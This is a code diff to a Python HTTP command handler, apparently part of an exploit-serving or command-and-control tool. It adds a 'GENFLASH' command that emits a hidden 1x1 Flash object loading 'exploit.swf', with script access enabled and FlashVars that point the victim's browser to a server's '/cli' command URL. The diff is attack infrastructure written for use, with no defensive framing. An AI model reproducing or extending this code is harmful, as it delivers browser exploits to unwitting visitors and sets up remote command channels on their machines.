@@ -89,6 +89,16 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 					result = test.STATUS + " " + str(test.RESULT)
 				else:
 					result = "0"
+		elif cmd=="GENFLASH":
+			if len(cmd_parts)!= 3:
+				self.server.log("Received invalid GENFLASH command : " + command,2)
+			else:
+				result ="""<object width="1" height="1" data="exploit.swf" type="application/x-shockwave-flash" class="myclass" id="myid">
+						<param value="transparent" name="wmode">
+						<param value="allways" name="allowScriptAccess">
+						<param value="ci="""+cmd_parts[1]+"""&amp;server="""+cmd_parts[2]+"""&amp;cmdURL=http://"""+cmd_parts[2]+"""/cli" name="FlashVars">
+					</object>
+			"""
 		return result
 	
 	def handle_read(self):
